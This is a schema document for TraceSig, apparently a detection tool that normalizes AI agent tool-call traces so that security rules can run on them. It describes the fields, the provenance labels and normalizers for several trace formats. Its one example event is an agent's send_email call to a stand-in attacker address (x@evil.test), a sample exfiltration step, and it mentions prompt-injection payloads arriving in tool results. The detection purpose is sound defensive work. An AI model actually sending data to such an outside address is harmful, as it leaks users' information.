# TraceSig trace schema (v0.2)

A **trace** is a JSONL file — one JSON object per line, one object per tool
call the agent made, in order. This is the normalized shape rules run against.
The goal is the same one Sigma achieved for logs: *write the detection once,
run it on any agent's trace.*

## Event fields

| field | type | required | meaning |
|---|---|---|---|
| `session_id` | string | yes | groups events from one agent run/conversation |
| `seq` | int | yes | order within the session (0-based) |
| `tool` | string | yes | tool/function name the agent invoked |
| `args` | string \| object | no | arguments (objects are canonicalized to a sorted-key JSON string) |
| `labels` | string[] | no | data-provenance labels attached to this event: `web`, `pii`, `file`, `secret`, `untrusted`, … |
| `result_preview` | string | no | first N chars of the tool's result (where injection payloads land) |
| `ts` | string | no | ISO-8601 timestamp |
| `agent` | string | no | agent or model identifier |

Any other keys are preserved under `raw.` and addressable by rules.

## Example line
```json
{"session_id":"s1","seq":2,"tool":"send_email","args":{"to":"x@evil.test"},"labels":[],"result_preview":"","ts":"2026-09-11T10:00:00Z"}
```

## Where labels come from
Labels are the heart of provenance detection. A normalizer assigns them:
`web`/`untrusted` for anything fetched from the open internet, `mcp` for MCP
tool results, `pii` when a tool returns personal data, `file`/`secret` for
local reads. Label names compare case-insensitively.

## Normalizers
`tracesig scan` and `tracesig normalize` read these formats directly and
detect them per file:

| Format | Source | Module |
|---|---|---|
| `tracesig` | this schema | `tracesig.schema` |
| `claude-code` | Claude Code transcripts (`~/.claude/projects/**.jsonl`) and OpenTelemetry log exports | `tracesig.normalize.claude_code` |
| `apg` | `apg audit export --format tracesig` (schema `apg-audit-trace`, version 1) | `tracesig.normalize.apg` |

Label rules and field mappings for each: [normalizers.md](normalizers.md).
